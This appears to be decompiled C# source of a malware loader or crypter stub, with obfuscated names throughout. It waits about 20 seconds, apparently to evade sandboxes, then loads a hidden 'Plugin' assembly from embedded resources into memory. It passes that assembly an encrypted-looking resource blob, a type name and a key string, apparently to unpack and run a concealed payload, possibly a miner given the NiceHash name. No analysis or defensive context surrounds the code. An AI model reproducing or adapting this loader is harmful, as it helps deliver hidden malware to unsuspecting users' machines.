using System;
using System.IO;
using System.Reflection;
using System.Threading;
using Plugin01;
using Whrgliqahjlr.Properties;

namespace Whrgliqahjlr;

public static class Program
{
	public static class NiceHash
	{
		public static void Prefix()
		{
			int num = 0;
			while (num < 20)
			{
				num++;
				Thread.Sleep(999);
			}
		}

		public static void Work()
		{
			byte[] flwzguzihxtla = Resources.Flwzguzihxtla;
			Class1.Plugin("gc9m9NLJxY8mZKkqiQL.IdYoLrLGjL5VqFCroNH", "T2RLBQVTPR", flwzguzihxtla, "Qccrpizgwfnineknbeafa");
		}
	}

	[STAThread]
	public static int Main(string[] args)
	{
		NiceHash.Prefix();
		AppDomain.CurrentDomain.AssemblyResolve += CurrentDomain_AssemblyResolve;
		new Action(NiceHash.Work)();
		return 0;
	}

	private static Assembly CurrentDomain_AssemblyResolve(object sender, ResolveEventArgs args)
	{
		if (args.Name.Contains("Plugin"))
		{
			AssemblyName assemblyName = new AssemblyName(args.Name);
			using Stream stream = Assembly.GetExecutingAssembly().GetManifestResourceStream("Whrgliqahjlr." + assemblyName.Name + ".dll");
			using MemoryStream memoryStream = new MemoryStream();
			stream.CopyTo(memoryStream);
			return Assembly.Load(memoryStream.ToArray());
		}
		return null;
	}
}
